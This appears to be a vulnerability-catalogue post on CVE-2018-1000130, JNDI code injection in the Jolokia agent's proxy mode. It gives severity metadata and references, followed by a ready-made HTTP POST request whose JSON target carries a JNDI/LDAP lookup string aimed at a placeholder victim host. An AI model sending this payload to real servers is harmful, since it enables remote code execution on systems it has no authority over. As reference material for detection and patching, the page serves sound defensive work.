---
layout: post
cve_id: CVE-2018-1000130
title: Jolokia Agent - JNDI Code Injection
pcap: true
pcap_path: /pcaps/2018/CVE-2018-1000130.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1000130.yaml
snort2_rule: N/A
snort3_rule: N/A
author: milo2012
severity: high
impact: 'Successful exploitation of this vulnerability can lead to remote code execution,
  compromising the affected system.

  '
remediation: 'Apply the latest security patches or updates provided by the vendor
  to fix the vulnerability.

  '
reference:
- https://jolokia.org/#Security_fixes_with_1.5.0
- https://access.redhat.com/errata/RHSA-2018:2669
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000130
- https://github.com/ARPSyndicate/cvemon
- https://github.com/SexyBeast233/SecBooks
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.1
  cve-id: CVE-2018-1000130
  cwe-id: CWE-74
  epss-score: 0.91608
  epss-percentile: 0.99657
  cpe: cpe:2.3:a:jolokia:webarchive_agent:1.3.7:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: jolokia
  product: webarchive_agent
tags:
- cve2018
- cve
- jolokia
- rce
- jndi
- proxy
- vkev
- vuln
---

## üîç Vulnerability Description
Jolokia agent is vulnerable to a JNDI injection vulnerability that allows a remote attacker to run arbitrary Java code on the server when the agent is in proxy mode.


## üåê HTTP Request
```nohighlight
POST /jolokia/read/getDiagnosticOptions HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.8
Connection: close
Content-Length: 151
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
{
"type":"read",
"mbean":"java.lang:type=Memory",
"target":{
"url":"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat"
}
}
```

